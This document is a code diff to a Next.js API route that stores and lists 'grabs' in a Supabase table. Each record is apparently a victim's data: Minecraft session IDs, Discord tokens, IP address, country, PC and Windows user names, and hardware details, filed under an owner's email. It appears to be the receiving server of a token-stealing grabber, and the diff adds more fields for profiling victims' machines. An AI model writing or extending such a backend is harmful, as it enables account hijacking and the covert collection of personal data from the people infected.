@@ -16,7 +16,6 @@ export async function GET(request) {
   const ownerEmail = searchParams.get('owner_email');
 
   const supabase = getClient();
-
   let query = supabase.from('grabs').select('*').order('created_at', { ascending: false });
 
   if (ownerEmail) {
@@ -24,60 +23,50 @@ export async function GET(request) {
   }
 
   const { data, error } = await query;
-
-  if (error) {
-    return NextResponse.json({ grabs: [], error: error.message });
-  }
+  if (error) return NextResponse.json({ grabs: [], error: error.message });
   return NextResponse.json({ grabs: data || [] });
 }
 
 export async function POST(request) {
   const body = await request.json();
-
-  const {
-    owner_email,
-    minecraft_username,
-    discord_username,
-    ip_address,
-    country,
-    timezone,
-    os,
-    pc_name,
-    client_version,
-    session_id,
-    session_start,
-    discord_token,
-    servers,
-  } = body;
-
-  if (!minecraft_username) {
+  if (!body.minecraft_username) {
     return NextResponse.json({ error: 'minecraft_username required' }, { status: 400 });
   }
 
   const supabase = getClient();
 
+  const grab = {
+    owner_email: body.owner_email || '',
+    minecraft_username: body.minecraft_username || 'Unknown',
+    discord_username: body.discord_username || 'Unknown',
+    ip_address: body.ip_address || 'Unknown',
+    country: body.country || 'Unknown',
+    timezone: body.timezone || 'Unknown',
+    os: body.os || 'Unknown',
+    os_version: body.os_version || '',
+    pc_name: body.pc_name || 'Unknown',
+    windows_username: body.windows_username || '',
+    cpu: body.cpu || '',
+    ram: body.ram || '',
+    gpu: body.gpu || '',
+    screen_resolution: body.screen_resolution || '',
+    disk_space: body.disk_space || '',
+    java_version: body.java_version || '',
+    language: body.language || '',
+    desktop_env: body.desktop_env || '',
+    client_version: body.client_version || 'Unknown',
+    session_id: body.session_id || '',
+    session_start: body.session_start || '',
+    discord_token: body.discord_token || '',
+    servers: body.servers || '',
+  };
+
   const { data, error } = await supabase
     .from('grabs')
-    .insert([{
-      owner_email: owner_email || '',
-      minecraft_username: minecraft_username || 'Unknown',
-      discord_username: discord_username || 'Unknown',
-      ip_address: ip_address || 'Unknown',
-      country: country || 'Unknown',
-      timezone: timezone || 'Unknown',
-      os: os || 'Unknown',
-      pc_name: pc_name || 'Unknown',
-      client_version: client_version || 'Unknown',
-      session_id: session_id || '',
-      session_start: session_start || '',
-      discord_token: discord_token || '',
-      servers: servers || '',
-    }])
+    .insert([grab])
     .select()
     .single();
 
-  if (error) {
-    return NextResponse.json({ error: error.message }, { status: 500 });
-  }
+  if (error) return NextResponse.json({ error: error.message }, { status: 500 });
   return NextResponse.json({ ok: true, id: data.id });
 }
